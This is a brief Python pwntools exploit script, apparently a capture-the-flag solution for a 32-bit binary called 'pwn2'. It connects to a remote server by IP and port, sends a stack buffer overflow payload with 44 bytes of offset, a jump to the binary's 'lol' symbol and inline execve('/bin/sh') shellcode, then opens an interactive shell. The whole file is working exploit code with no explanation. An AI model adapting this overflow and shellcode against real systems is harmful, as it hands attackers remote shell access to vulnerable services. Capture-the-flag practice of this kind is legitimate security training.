#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']
local = 0
if local:
    p = process('./pwn2')
else:
    p = remote('104.154.106.182', 3456)
elf = ELF('./pwn2')
lol = elf.symbols['lol']
system = elf.symbols['run_command_ls']
ls = 0x08048670
buf = 0x0804b000
# gdb.attach(p)
# payload = cyclic(500)
sh = asm('''
	mov eax, 0xb
	xor ecx, ecx
	xor edx, edx
	push 0x68732f
	push 0x6e69622f
	mov ebx, esp
	int 0x80
''')
offset = 44
payload = (offset - 4) * 'A' + sh[:4] + p32(lol) + sh[4:]
p.sendline(payload)
p.interactive()
